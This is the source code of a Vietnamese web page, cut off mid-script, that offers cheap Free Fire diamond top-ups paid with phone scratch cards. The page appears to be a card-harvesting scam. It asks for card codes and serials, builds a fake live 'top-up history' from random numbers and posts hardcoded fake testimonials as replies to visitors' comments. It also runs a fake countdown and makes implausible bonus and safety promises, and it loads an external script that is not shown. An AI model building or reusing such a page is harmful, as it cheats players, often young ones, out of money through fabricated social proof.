<?php
     $file = "bodem.log";
$act = fopen ($file, "r");
$dem = fread ($act, filesize ($file) );
fclose ($act);
$dem++;
$act = fopen ($file, "w");
fwrite ($act, $dem);
fclose ($act);
// echo ($dem);

?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="author" content="NẠP FREE FIRE">
    <link rel="icon" href="images/free-fire-icon.webp">
    <title>Nạp Thẻ Free Fire - Nạp Free Fire Nhanh - Kênh Nạp Kim Cương FF</title>
    <meta name="description" content="Trang web nạp thẻ Free Fire nhanh bằng các loại thẻ cào. Trang nạp thẻ Free Fire chính thức tại Việt Nam, Kim cương sạch 100% không bị khoá tài khoản"
    />
    <link rel="canonical" href="https://napkimcuong.online/" />
    <link rel="alternate" href="https://napkimcuong.online/" hreflang="vi-vn" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;0,700;0,900;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">

    
    <link href="css/chat.css" rel="stylesheet">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type='text/javascript'></script>

       <style>
        @import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i,700,700i,900,900i&display=swap);
        @font-face {
    src: url(Raleway-Bold.ttf);
    font-family: raleway_bold;
}
        body {
    font-style: normal;
    font-weight: 400!important;
    font-size: 13px!important;
    letter-spacing: 0!important;
    color: #000;
    position: relative;
    font-family: Roboto, sans-serif!important;
    top: initial!important;
}
a{
    text-decoration: none   
}
.tg_wrap_ccc_idx {
    background: #f5f5f5;
    padding: 90px 0px 0px 0px;
}

.tg_countdown_idx {
	display: table;
    margin: 0px auto 30px auto;
    background: linear-gradient(to right, rgb(255, 0, 0) 0%, rgb(255, 132, 0) 100%);
    padding: 13px 20px;
    border-radius: 10px;
    width: 100%;
    max-width: 670px;
}

.tg_countdown_idx .pricedm_cd_idx {
  
    float: left;
}

.tg_countdown_idx .pricedm_cd_idx a {
    margin: 0px;
    font-size: 20px;
    font-family: 'raleway_bold';
    font-style: italic;
    color: #fff;
    position: relative;
    padding: 0px 0px 0px 20px;
}

.tg_countdown_idx .pricedm_cd_idx a::before {
    content: url(https://img.tenten.vn/k/lp/tenten-new-design/images/icon_thunder_sale_2021.png);
    position: absolute;
    top: 0px;
    left: 0px;
}

.tg_countdown_idx .pricedm_cd_idx a strong {
    color: #fff700;
}

.tg_countdown_idx .cd_area_idx {
    float: right;
    margin: 2px 0px 0px 0px;
}

.tg_countdown_idx .cd_area_idx #tg_countdown {
    display: inline-block;
    vertical-align: middle;
}

.tg_countdown_idx .cd_area_idx p {
    margin: 0px 10px 0px 0px;
    display: inline-block;
    color: #fff;
    font-size: 16px;
    line-height: 23px;
    vertical-align: middle;
}

.tg_countdown_idx .cd_area_idx #tg_countdown li {
    display: inline-block;
    font-size: 18px;
}

.tg_countdown_idx .cd_area_idx #tg_countdown strong {
    background: #fff;
    padding: 2px 10px;
    border-radius: 5px;
}

.tg_countdown_idx .cd_area_idx #tg_countdown span {
    color: #ffffff;
    margin: 0px 3px 0px 5px;
}

.tg_countdown_idx .tg_regislink_cd {
    display: none;
}

.tg_countdown_idx .tg_regislink_cd a {
    font-size: 18px;
    font-family: 'raleway_bold';
    font-style: italic;
    position: relative;
    padding: 0px 0px 0px 40px;
    animation: color-change 1s infinite;
}


    </style>
    <style>
@import url('https://fonts.googleapis.com/css2?family=Arimo:wght@400;500;600&display=swap');

    body{font-family:"Arial",sans-serif;font-size:16px;margin:0;padding:0;color:#222;overflow-x:hidden;counter-reset:my-sec-counter;scroll-behavior: smooth}
    .text-center {
    text-align: center!important;
    font-size: 15px;
}
.table>:not(caption)>*>* {
    padding: 0.6rem 0.5rem;
}
tbody, td, tfoot, th, thead, tr {
    border-color: inherit;
    border-style: solid;
    border-width: 0;
    border: 1px solid #ddd;
}
.navbar-brand {
    font-size: inherit;
}
.btn-warning {
    color: #000;
    background-color: #ffc107;
    border-color: #ffc107;
    font-weight: bold;
}

body {
   background:#fff;
}
td small {
    color: #ff2300;
    font-size: 12px;
}
a {
    text-decoration: none;
}
nav.navbar.navbar-light.bg-light {
    background-color: #fff!important;
    background-repeat: repeat;
    background-size: cover;
    border: none;
    background-image: none;
}
.list-group-item {
    border: none;
}
td small {
    color: #0a6abd;
    font-size: 12px;
}
.apple {
    color: #fff;
    background: #dc3545;
    font-size: 13px;
    border-radius: 100px;
    border:none;
}
input.form-control {
    border: none;
    border-top: 1px solid #d9d9d9;
    border-radius: 0;
    border-bottom: 1px solid #d9d9d9;
    font-size: 14px;
}
select {
    border: none!important;
    font-size: 14px!important;
    border-top: 1px solid #d9d9d9!important;
    border-bottom: 1px solid #d9d9d9!important;
    border-radius: 0!important;
}
label.small.mb-2 {
    font-size: 13px;
    font-weight: bold;
}

table.table.text-center {
    font-weight: bold;
    font-size: 13px;
}
small.d-block {
    font-size: 12px;
}
i.fa.fa-check {
    color: #00af5e;
    font-size: 11px;
    margin-right: 5px;
}
.col.is-choose img{
    border: 1px solid #f00;
    border-radius: 5px;
}
.item img{
 border: 1px solid #ddd;
    border-radius: 5px;
}
.apple {
    font-size: 13px!important;
    border-radius: 5px!important;
}
input.form-control {
    border: 1px solid #d9d9d9;
    font-size: 15px;
}
.btn-danger {
    color: #fff;
    background-color: #dc3545;
    border-color: #dc3545;
    font-size: 15px;
}

u {
    text-decoration: none;
}
b, strong {
    font-weight: 600!important;
}
a.list-group-item {
    background-image: linear-gradient( 
-15deg
 , #dd3545 0%, #c70013 50%, #c34b4b 50%);
    color: #fff!important;
    margin-bottom: 10px;
}
body{
        font-size: 14px!important;
}
input.form-control {
    border: 1px solid #d9d9d9;
    font-size: 14px;
}
select {
    border: none!important;
    font-size: 14px!important;
    border: 1px solid #d9d9d9!important;
    border-radius: 0!important;
}

a.list-group-item {
    background-image: linear-gradient( 
-15deg
 , #008abf 0%, #51aed3 50%, #4b97c3 50%);
    color: #fff!important;
    margin-bottom: 10px;
}
a.list-group-item {
    background-image: linear-gradient( 
-15deg
 , #df0000 0%, #e20506 50%, #e75c5c 50%);
    color: #fff!important;
    margin-bottom: 10px;
}
td {
    font-weight: 400!important;
}
</style>

<script src="//cdn.jsdelivr.net/npm/sweetalert2@11">

     
</script>
</head>

<body>

    <header>
        <nav class="navbar navbar-default navbar-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Menu</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
                    <a href="/"><img class="navbar-brand" src="images/logo.png" alt="logo"></a>
                </div>
                <div id="navbar" class="collapse navbar-collapse navbar-right">
                    <ul class="nav navbar-nav">
                        <li><a href="">Hướng dẫn</a></li>
                    </ul>
                </div>
                <!--/.nav-collapse -->
            </div>
        </nav>
    </header>

    <section>
        <div class="container">

            <ul class="breadcrumb">

                <li><a href="https://napkimcuong.online/">Trang chủ</a></li>

                <li class="active">Nạp thẻ Free Fire</li>

            </ul>


            <div class="banner">
                <img src="images/free-fire-banner.jpg" alt="Nạp thẻ Free Fire" title="Nạp thẻ Free Fire">
            </div>


            <div class="main-content">
                <div class="main-title">
                    <img class="title-image" src="images/free-fire-icon.webp" alt="Free Fire Icon">
                    <h1>Nạp thẻ Free Fire</h1>
                </div>
                <p class="alert alert-info"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Ưu Đãi  2022: <strong>nhân đôi Kim Cương</strong> khi nạp các loại thẻ có giá trị từ <strong>100.000đ</strong> trở lên <span class="text-danger">(Duy nhất trong hôm nay)</span></p>
                <p class="alert alert-info"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Cam kết kim cương sạch từ nhà phát hành 100% không bị khoá tài khoản </p>
<div class="tg_countdown_idx">
        <div class="pricedm_cd_idx">
            <a href="javascript:void(0);">Sự kiện <strong>kết thúc sau</strong>!</a>
        </div>
        <div class="cd_area_idx">
            
            <ul id="tg_countdown">
                <li><strong id="days_tg">0</strong><span>:</span></li>
                <li><strong id="hours_tg">02</strong><span>:</span></li>
                <li><strong id="minutes_tg">19</strong><span>:</span></li>
                <li><strong id="seconds_tg">54</strong></li>
            </ul>
        </div>
        <div class="tg_regislink_cd">
            <a href="javascript:void(0);">Đăng ký ngay hôm nay</a>
        </div>
    </div>
                <div class="main_thanh-toan">
                    <div class="main-section__title">
                        <span class="main-section__title-channel-icon"></span>
                        <div class="main-section__title-txt main-section__title-channel"> Nạp thẻ </div>
                    </div>
                    <div class="row">
                        <div class="col-md-6">

                            <div class="form-thanh-toan">
                              

                                    <div class="form-group">
                                        <label for="tentk">ID/Tài khoản</label>
                                        <input type="text" class="form-control" name="tentk" id="tentk" placeholder="Nhập ID hoặc tên tài khoản cần nạp">
                                    </div>

                                    <div class="form-group">
                                        <label for="loaithe">Loại thẻ</label>
                                        <select name="loaithe" id="loaithe" class="form-control" required="required">
                        <option value="VIETTEL">Viettel</option>
                        <option value="MOBIFONE">Mobifone</option>
                        <option value="VINAPHONE">VinaPhone</option>
                        <!--<option value="VNMOBI">VN Mobile</option>-->
                    </select>
                                    </div>

                                    <div class="form-group">
                                        <label for="menhgia">Mệnh giá thẻ</label>
                                        <select name="menhgia" id="menhgia" class="form-control" required="required">
                        <option value="" selected="selected">-Mệnh giá thẻ-</option>
						<option value="20000">20.000đ - 100 Kim cương</option>
						<option value="50000">50.000đ - 3.200 Kim cương </option>
						<option value="100000">100.000đ - 9.100 Kim cương</option>
						<option value="200000">200.000đ - 21.900 Kim cương</option>
						<option value="500000">500.000đ - 51.400 Kim cương</option>
                        <option value="1000000">1.000.000đ - 112.000 Kim cương</option>
                    </select>
                                        <p class="text-danger">Chú ý: nếu chọn sai mệnh giá sẽ bị mất thẻ</p>
                                    </div>
   <div class="form-group">
                                        <label for="mathe">Mã thẻ</label>
                                        <input type="text" class="form-control" name="mathe" id="mathe" placeholder="Nhập mã thẻ cào in trên thẻ">
                                    </div>
                                    <div class="form-group">
                                        <label for="seri">Số seri</label>
                                        <input type="text" class="form-control" name="seri" id="seri" placeholder="Nhập số seri in trên thẻ">
                                    </div>

                                 



                                    <div id="result"></div>

                                    <div class="spinner hide">
                                        <div class="rect1"></div>
                                        <div class="rect2"></div>
                                        <div class="rect3"></div>
                                        <div class="rect4"></div>
                                        <div class="rect5"></div>
                                    </div>

                               
                                    <input type="hidden" name="thanhtoan" value="Free Fire">

                                    <button type="submit" data-loading-text="ĐANG XỬ LÝ" id="napthe" class="btn btn-danger btn-block">NẠP THẺ</button>
                                
                            </div>
                        </div>
                        <div class="col-md-offset-1 col-md-5" >
                            <h2 class="table-title">Bảng giá quy đổi Kim Cuơng</h2>
                            <table class="table table-hover" style="-webkit-box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);">
                                <thead>
                                    <tr>
                                        <th class="text-danger">Mệnh giá</th>
                                        <th class="text-danger">Kim Cương</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td class="text-danger">10.000 VNĐ</td>
                                        <td class="text-danger">Không hỗ trợ</td>
                                    </tr>
                                    <tr>
                                        <td>20.000 VNĐ</td>
                                        <td>100 Kim Cương</td>
                                    </tr>
                                    <tr>
                                        <td>50.000 VNĐ</td>
                                        <td>3.200 Kim Cương <img src="1601223_26448.gif" width="20" class="me-2"></td>
                                    </tr>
                                    <tr>
                                        <td>100.000 VNĐ</td>
                                        <td>9.100 Kim Cương <img src="1601223_26448.gif" width="20" class="me-2"></td>
                                    </tr>
                                    <tr>
                                        <td>200.000 VNĐ</td>
                                        <td>21.900 Kim Cương</td>
                                    </tr>
                                    <tr>
                                        <td>500.000 VNĐ</td>
                                        <td>51.400 Kim Cương</td>
                                    </tr>
                                    <tr>
                                        <td>1.000.000 VNĐ</td>
                                        <td>112.000 Kim Cương</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                   
                </div>
            </div>
            <div class="main-title" style="margin-top: 30px">
                <h2 style="font-size: 20px;text-transform: uppercase;">Bình luận</h2>
                </div>
            <div class="entries" style="margin-bottom: 50px;-webkit-box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);box-shadow: 0 0 20px 0 rgb(0 0 0 / 10%);">
                <div class="chat comments box-border">
                <div class="chat-history">
                <ul class="list-unstyled chat-scroll">
                <li>
                <div class="message-data">
                <span class="message-data-name"><i class="fa fa-circle online"></i> Khách</span>
                <span class="message-data-time">4:30 PM, </span>
                </div>
                <div class="message my-message">
                Cứ tưởng lừa đảo, nạp thử 200k nhận luôn kim cương trong 10s
                </div>
                </li>
                <li>
                <div class="message-data">
                <span class="message-data-name"><i class="fa fa-circle online"></i> Khách</span>
                <span class="message-data-time">4:30 PM, </span>
                </div>
                <div class="message my-message">
                Đã nạp thành công
                </div>
                </li>
                <li>
                <div class="message-data">
                <span class="message-data-name"><i class="fa fa-circle online"></i> Khách</span>
                <span class="message-data-time">4:30 PM, </span>
                </div>
                <div class="message my-message">
                Web nạp ngon thế này mà giờ mới biết
                </div>
                </li>
                <li>
                <div class="message-data">
                <span class="message-data-name"><i class="fa fa-circle online"></i> Khách</span>
                <span class="message-data-time">4:30 PM, </span>
                </div>
                <div class="message my-message">
                Vừa chạy ra quán mua 500k thẻ nạp ăn luôn, ngon quá admin
                </div>
                </li>
                
                
                        
                    </ul>
                <div class="chat-message clearfix">
                <textarea name="message-to-send text-right" id="message-to-send" placeholder="Nhập bình luận..." rows="2"></textarea>
                <button type="button" class="btn-send-message
                                                        pill-button">Gửi bình luận</button>
                </div> 
                </div> 
                </div>
                </div>
                
                <small class="d-block mt-3">Lịch sử nạp thẻ gần đây</small>
                  <h5 class="bold mt-2"><i class="bi bi-shield-check me-2"></i> Lịch sử nạp game Free Fire</h5>
 <div class="table-responsive mt-3">
                <div class="table-responsive mt-3">
                 <table class="table table-striped text-center">
  <thead>
    <tr>
      <th scope="col"><i class="bi bi-clock"></i></th>
      <th scope="col">Người chơi</th>
      <th scope="col">Trạng thái</th>
    </tr>
  </thead>
  <tbody id="table_history">
       <tr id="the1"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the2"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the3"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the4"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the5"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the6"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the7"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the8"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the9"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the10"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the11"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the12"><td>...</td><td>...</td><td>...</td></tr>
    <tr id="the13"><td>...</td><td>...</td><td>...</td></tr>
  </tbody>
</table>
</div>
 <article class="chu-thich">
                        <h2 class="text-title">Nạp thẻ game Free Fire</h2>
                        <p>Sau đây trang web xin hướng dẫn cách tải và <strong>nạp thẻ Free Fire</strong> trên mọi thiết bị giúp người chơi dễ dàng cài đặt trò chơi vào máy và trải nghiệm đầy đủ tính năng trong game.</p>
                        <!--<img src="images/freefire-1.jpg" alt="Nạp thẻ Free Fire" width="100%"> -->

                        <br>
                        <h2 class="text-title">Cách nạp thẻ FF bằng thẻ cào</h2>
                        <p><strong>PHẦN 1: HƯỚNG DẪN NẠP FREE FIRE</strong>

                            <p>Free Fire hiện nay đã có mặt trên hiệ điều hành IOS và Android, đồng thời thông qua một số phần mềm giả lập trên PC người chơi có có thể down và cài đặt FF về máy tính. Vì Free Fire thuộc loại được thiết lập riêng dành cho
                                thiết bị di động nên trong bài viết này sẽ hướng dẫn bạn tải và cài đặt và nạp thẻ Free Fire trên hai dòng điện thoại phổ biến hiện nay là Android và IOS.</p>
                            <!-- <img src="images/freefire-2.jpg" alt="Nạp thẻ Free Fire" width="100%"> -->
                            <br>
                            <br>
                            <p>Đối với điện thoại hệ điều hành Androi bạn truy cập vào CH Play chọn tìm kiếm và nhập Free Fire vào ô tìm kiếm sau đó down và cài FF vào điện thoại di đông. Đối với điện thoại hệ điều hành IOS cũng vậy, nhưng thay vì truy cập
                                vào CH Play bạn truy cập vào App Store.</p>

                            <strong>PHẦN 2: HƯỚNG DẪN NẠP THẺ FREE FIRE VN</strong>

                            <p>Có nhiều cách nạp Kim cương Free Fire mà người chơi có thể sử dụng như: Nạp trực tiếp trong game, nạp bằng thẻ Garena, đổi sò sang kim cương… Tuy nhiên trong bài viết này sẽ hướng dẫn bạn cách nạp thẻ Garena Free Fire bằng
                                thẻ cào.</p>


                            <p>Bước 1: Mua thẻ cào</p>

                            <p>Các bạn hay mua các loại thẻ cào điện thoại hoặc thẻ Garena để tiến hành nạp KC vào Free Fire, sau khi có thẻ các bạn hay cào thẻ và nhập seri + mã thẻ vào phần bên trên để tiến hành nạp thẻ FF</p>


                            <p>Bước 2: Truy cập vào mục bên trên và nhập vào tài khoản Free Fire đang chơi của bạn. Lưu ý nến bạn đăng nhập game bằng FB bạn nên chọn biểu tượng của FB để đăng nhập. Và nếu đăng nhập game bằng tài khoản ID bạn nên lựa chọn
                                đăng nhập bằng tài khoản ID để nạp.</p>
                    </article>
        </div>
        <!-- /.container -->

    </section>

    <footer class="footer">
        <div class="container">
            <nav class="footer-link-wrap">
                <a class="footer-link-txt" href="">Câu hỏi thường gặp</a> | <a class="footer-link-txt" href="">Điều khoản sử dụng</a> | <a class="footer-link-txt" href="">Chính sách bảo mật</a>
            </nav>

            <div class="footer-copy">&copy; 2022 NAPKIMCUONG.ONLINE</div>
        </div>
    </footer>

    
    

   


    <script src="js/bootstrap.min.js"></script>
    <script src="js/napthe.js"></script>


  
    <script type="text/javascript" src="https://napgamesieure.net/assets/frontend/js/script.js"></script>
    
<div id="m_scroll_top" class="m-scroll-top">
<i class="fas fa-arrow-up"></i>
</div>
<style>
  .m-scroll-top.show {
      display: block;
  }
  .m-scroll-top {
      width: 40px;
      height: 40px;
      position: fixed;
      bottom: 50px;
      right: 20px;
      cursor: pointer;
      text-align: center;
      vertical-align: middle;
      display: none;
      padding-top: 9px;
      z-index: 110;
      border-radius: 100%;
      background-color: #fff;
      box-shadow: 0 2px 6px 0 rgb(0 0 0 / 20%), 0 1px 1px 0 rgb(0 0 0 / 20%);
  }
</style>
<script id="history-template" type="text/x-handlebars-template">
    <tr>
        <td class="text-danger"><b>{{idCustomer}}</b></td>
        <td class="base-color"><b>{{txtHistory}}</b></td>
    </tr>
</script>
<script id="message-template" type="text/x-handlebars-template">
    <li class="clearfix">
        <div class="message-data align-right">
            <span class="message-data-time" > {{time}} , Vừa xong</span> &nbsp; &nbsp;
            <span class="message-data-name" >Bạn</span> <i class="fa fa-circle me"></i>
        </div>
        <div class="message other-message float-right">
            {{messageOutput}}            </div>
    </li>
</script>
<script id="message-response-template" type="text/x-handlebars-template">
    <li>
        <div class="message-data">
            <span class="message-data-name"><i class="fa fa-circle online"></i> Khách</span>
            <span class="message-data-time"> {{time}}, Vừa xong</span>
        </div>
        <div class="message my-message">
            {{response}}            </div>
    </li>
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/3.0.0/handlebars.min.js"></script>
<script id="rendered-js">
setInterval(function() {
    const months = ["<b style='color:red;font-size:14px'>Thẻ sai!</b>","<b style='color:green;font-size:14px'>+3 200 kim cương<b/>","<b style='color:green;font-size:14px'><b/>","<b style='color:green;font-size:14px'>+9 100 kim cương<b/>","<b style='color:green;font-size:14px'>+21 900 kim cương<b/>","<b style='color:green;font-size:14px'>+51 400 kim cương<b/>"];
    const time = ['s', 'p','h','p','s','p'];
    const random1 = Math.floor(Math.random() * 6);
    const random2 = Math.floor(Math.random() * 6);
    const random3 = Math.floor(Math.random() * 6);
    const random4 = Math.floor(Math.random() * 6);
    const random5 = Math.floor(Math.random() * 6);
    const random6 = Math.floor(Math.random() * 6);
    const random7 = Math.floor(Math.random() * 6);
    const random8 = Math.floor(Math.random() * 6);
    const random9 = Math.floor(Math.random() * 6);
    const random10 = Math.floor(Math.random() * 6);
    const random11 = Math.floor(Math.random() * 6);
    const random12 = Math.floor(Math.random() * 6);
    const random13 = Math.floor(Math.random() * 6);
    $("#the1").html('<td>'+Math.floor(Math.random() * 24)+ time[random1]+' trước</td><td>*********</td><td>'+months[random1]+'</td>');
    $("#the2").html('<td>'+Math.floor(Math.random() * 24)+time[random2]+' trước</td><td>*********</td><td>'+months[random2]+'</td>');
    $("#the3").html('<td>'+Math.floor(Math.random() * 24)+time[random3]+' trước</td><td>*********</td><td>'+months[random3]+'</td>');
    $("#the4").html('<td>'+Math.floor(Math.random() * 24)+time[random4]+' trước</td><td>*********</td><td>'+months[random4]+'</td>');
    $("#the5").html('<td>'+Math.floor(Math.random() * 24)+time[random5]+' trước</td><td>*********</td><td>'+months[random6]+'</td>');
    $("#the6").html('<td>'+Math.floor(Math.random() * 24)+time[random6]+' trước</td><td>*********</td><td>'+months[random6]+'</td>');
    $("#the7").html('<td>'+Math.floor(Math.random() * 24)+time[random3]+' trước</td><td>*********</td><td>'+months[random5]+'</td>');
    $("#the8").html('<td>'+Math.floor(Math.random() * 24)+time[random6]+' trước</td><td>*********</td><td>'+months[random4]+'</td>');
    $("#the9").html('<td>'+Math.floor(Math.random() * 24)+time[random5]+' trước</td><td>*********</td><td>'+months[random3]+'</td>');
    $("#the10").html('<td>'+Math.floor(Math.random() * 24)+time[random4]+' trước</td><td>*********</td><td>'+months[random2]+'</td>');
    $("#the11").html('<td>'+Math.floor(Math.random() * 24)+time[random2]+' trước</td><td>*********</td><td>'+months[random1]+'</td>');
    $("#the12").html('<td>'+Math.floor(Math.random() * 24)+time[random3]+' trước</td><td>*********</td><td>'+months[random4]+'</td>');
    $("#the13").html('<td>'+Math.floor(Math.random() * 24)+time[random1]+' trước</td><td>*********</td><td>'+months[random3]+'</td>');
}, 1000);

window.onload = function()
{
   Swal.fire(
  'Thông báo',
  'Số lượt mua kim cương đang rất lớn, Mỗi ID vui lòng chỉ mua 1 lần.',
  'info'
)
};
jQuery(document).ready(function(){



 //Set the date we're counting down to
 var today = new Date();
 var dd = String(today.getDate() + 1).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
var yyyy = today.getFullYear();
today =  yyyy +  '/' + mm + '/' + dd;

var countDownDate = new Date(today).getTime();
console.log(today);
// Update the count down every 1 second
var time = setInterval(function() {
// Get todays date and time
var now = new Date().getTime();
// Find the distance between now and the count down date
var distance = countDownDate - now;
// Time calculations for days, hours, minutes and seconds
var days_tg = Math.floor(distance / (1000 * 60 * 60 * 24));
var hours_tg = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutes_tg = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var seconds_tg = Math.floor((distance % (1000 * 60)) / 1000);
// Output the result in an element with id="demo"
jQuery("#days_tg").html(days_tg);
if(hours_tg<10){
  jQuery("#hours_tg").html('0'+hours_tg);
}
else{
  jQuery("#hours_tg").html(hours_tg);
}
if(minutes_tg<10){
  jQuery("#minutes_tg").html('0' + minutes_tg);
}
else{
  jQuery("#minutes_tg").html(minutes_tg);
}
if(seconds_tg<10){
  jQuery("#seconds_tg").html('0'+seconds_tg);
}
else{
  jQuery("#seconds_tg").html(seconds_tg);
}

});



}); 
    (function () {

        var chat = {
            messageToSend: '',
            messageResponses: [
                'Dịch vụ nạp uy tín ghê',
                'Uy tín không anh em.',
                'Vãi vừa ấn nạp xong vào game có ngay (y)',
                'Web uy tín đấy, vừa nạp 500k xong.',
                'Nãy có ông bạn nạp 500k xong vào nạp luôn, quá xịn admin ơi.',
                'Thanks admin <3 , uy tín lắm luôn',
                'Nhanh gọn uy tín, thanks admin',
                'Web xịn không scam nha mọi người',
                'Hàng sạch, thanks admin',
                'Vừa nạp xong, quá ngon',
                'Web ok không anh em, có scam không?',
                'Vừa chạy ra quán mua 500k thẻ nạp ăn luôn, ngon quá admin',
                'Nhập nhầm mã thẻ với serial báo admin xử lý trong vòng 1 nốt nhạc, uy tín quá admin ơi',
                'Cứ tưởng lừa đảo, nạp thử 200k nhận luôn kim cương trong 10s',
                '1 vote uy tín cho web nhé, quá ngon luôn',
                'Bị lừa nhiều rồi, giờ mới tìm được web uy tín, thanks ad',
                'Vừa nạp 100k xong',
                'Web ngon vl',
                'Anh em nào chưa nạp thì vào nạp ngay đi đang có khuyến mại',
                'Uy tín lắm admin',
                'Vote 10000k sao nhé, quá uy tín',
                'Có anh em nào vừa từ youtube qua đây nạp k',
                'Ông em vừa giới thiệu, nạp cái ăn luôn, ngon vc',
                'Uy tín nhé anh em',
                'Đã nạp thành công',
                'Đã nạp ở đây 20tr tiền thẻ, vote uy tín nhé',
                'Web nạp ngon thế này mà giờ mới biết',
                'Đã nạp, nhanh lắm nhé',
                'Ngon vcl, +5 sao cho admin',
                'Nghe anh em review ngon quá, tôi ra làm cái thẻ 500k nạp đây',
                'Không scam, web nạp thật, nhận thật nhé !',
                'Đã nạp và thấy ngon ngọt nhé ae',
                'Web này trùm nạp mẹ rồi',
                'Web được đấy anh em',
                'Thấy web được nhiều anh em nạp rồi, yên tâm nạp hehe',
                'Anh em không phải sợ đâu, tôi nạp nhiều web này rồi',
                'Web xịn không scam nha mọi người',
                'uy tín nhé cảm ơn shop',
                'cho e voi',
                'e nua a',
                'e cung muon',
                'Trang này rất uy tín nha anh em',
                'ở đây uy tín lắm ạ mình mới nạp 200k nhận đc goi qua mag xà',
                'ai nhận được mb chưa',
                'vc t được mb luôn',
                'tao thấy as trên livetrym có quảng cáo để t thử',
                'ngon quá sự kiện này đang hot anh em nạp 100k nhận mb kìa',
                'nhanh nhanh để hết sự kiện mất',
                'sẵn đang có tiền lì xì t phải nạp 500k',
                't k bt cavh nạp thẻ vào đây',
                'ngon ngon moi nap 100k duoc goi qua vv',
                'chúc mừng năm mới',
                'Uy tín nha anh em tui nạp 30s được nhận kim cương luôn',
                'Uy Tín Đó Anh Em t dc mã code t nhập cho 5 acc luôn',
                'Quá uy tín luôn vừa xem từ live của bác gấu qua đây',
                'Trang này 100% uy tín nhé vừa nạp 50k',
                'má nó nạp thẻ đúng ms dc ae ạ',
                'Vừa được thằng ytb giới thiệu vô nạp liền thử',
                'ai thấy t cmt k',
                'có',
                'thấy',
                'Ai không biết nạp thì chịu',
                'xin cái thẻ đi ae',
                'vừa từ tiktok qua',
                'vừa nạp 100k duyệt ngay 10s @@',
                'ahihi nạp thành công 500k rồi',
                'đr kim cương sạch đấy mình cũng nạp r',
                'Kim cương sạch nha anh em mình nạp kh mất acc',
                'cam kết 100k uy tín nha anh em tui nạp rồi mới dám nói v',
                'ôi uy tín thật vừa thử 50k',
                'anh em phản hồi uy tín nhiều quá mình cũng thử đây',
                'nạp bao nhiêu v',
                'nạp được rồi',
                'có lừa không v????',
                ' này có kim cương chơi r ae ạ',
                ' nạp cái này thì quá ngon luôn',
                'nạp 1 lần 500k và duyệt nhanh vc',
                '',
                'thấy',
                'có thấy',
                'thấy mà',
            ],

            init: function () {
                this.cacheDOM();
                this.bindEvents();
                this.render();
            },
            cacheDOM: function () {
                this.$chatHistory = $('.chat-history');
                this.$button = $('.btn-send-message');
                this.$textarea = $('#message-to-send');
                this.$chatHistoryList = this.$chatHistory.find('ul');
            },
            bindEvents: function () {
                this.$button.on('click', this.addMessage.bind(this));
                this.$textarea.on('keyup', this.addMessageEnter.bind(this));
            },
            render: function () {

                this.scrollToBottom();
                if (this.messageToSend.trim() !== '') {
                    var template = Handlebars.compile($("#message-template").html());
                    var context = {
                        messageOutput: this.messageToSend,
                        time: this.getCurrentTime()
                    };
                    this.$chatHistoryList.append(template(context));
                    this.scrollToBottom();
                    this.$textarea.val('');
                }
                // history-card
                var templateHistoryResponse = Handlebars.compile($("#history-template").html());
                var arrayTelCo = ['VIETTEL', 'VINAPHONE', 'MOBIFONE', 'VIETNAMOBILE', 'ZING'];
                var arrayPrice = ['10.000 đ', '20.000 đ', '30.000 đ', '50.000 đ', '100.000 đ', '200.000 đ', '300.000 đ', '500.000 đ', '1.000.000 đ'];
                var html = '';
                for (var i = 0; i < 10; i++) {
                    var contentHistory = {
                        idCustomer: '******' + Math.floor(100000 + Math.random() * 900000),
